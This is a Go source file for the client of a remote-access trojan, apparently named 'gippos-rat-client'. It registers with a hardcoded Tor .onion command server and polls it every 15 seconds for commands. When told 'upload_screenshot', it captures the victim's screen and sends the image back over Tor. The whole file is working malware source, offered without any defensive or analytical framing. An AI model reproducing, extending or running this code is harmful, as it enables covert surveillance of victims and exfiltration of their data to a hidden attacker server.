package main

import (
	"encoding/json"
	"fmt"
	"gippos-rat-client/pkg"
	"io"
	"net/http"
	"time"
)

const (
	onionURL = "http://hb6sieni54tpehjmosgzugeb5vkaxwwdhyyris74yeuyeew33s3bbwyd.onion"
)

type Command struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

func fetchCommand(client *http.Client, onionURL, ClientURL string) ([]Command, error) {
	resp, err := client.Get(fmt.Sprintf("%s/commands?client_id=%s", onionURL, ClientURL))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	var commands []Command
	json.Unmarshal(body, &commands)
	return commands, nil
}

func main() {
	httpClient := pkg.NewTorClient()

	clientID, err := pkg.CreateClient(httpClient, onionURL)
	if err != nil {
		fmt.Println("Ошибка создания клиента:", err)
		return
	}

	for {
		commands, err := fetchCommand(httpClient, onionURL, clientID)
		if err != nil {
			fmt.Println("Ошибка получения команд:", err)
			time.Sleep(10 * time.Second)
			continue
		}

		for _, cmd := range commands {
			if cmd.Command == "upload_screenshot" {
				filename, err := pkg.MakeScreenShot()
				if err == nil {
					pkg.SendScreenshot(httpClient, onionURL, clientID, filename)
				}
			}
		}

		time.Sleep(15 * time.Second)
	}
}
